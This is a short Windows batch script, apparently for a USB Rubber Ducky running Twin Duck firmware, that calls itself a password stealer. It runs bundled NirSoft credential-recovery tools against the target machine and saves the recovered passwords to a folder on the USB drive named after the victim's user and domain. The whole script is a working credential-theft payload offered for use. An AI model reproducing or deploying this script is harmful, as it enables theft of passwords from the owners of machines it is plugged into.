REM ######################################################
REM # Title: Rubber Ducky Password Stealer               #
REM # Description: CMD script for the Twin Duck firmware #
REM # Target: Windows 10/11 x32/x64                      #
REM # Author: Krouwndouwn                                #
REM ######################################################

REM ----- Variables -----
set nirsoft_files=%~d0\files\nirsoft
set results_folder=%~d0\results\%USERDOMAIN%@%USERNAME%

REM ----- Save nirsoft results -----
for /r %nirsoft_files% %%f in (*.rdps) do if exist %nirsoft_files%\%%~nxf start %nirsoft_files%\%%~nxf /stext %results_folder%\%%~nf.txt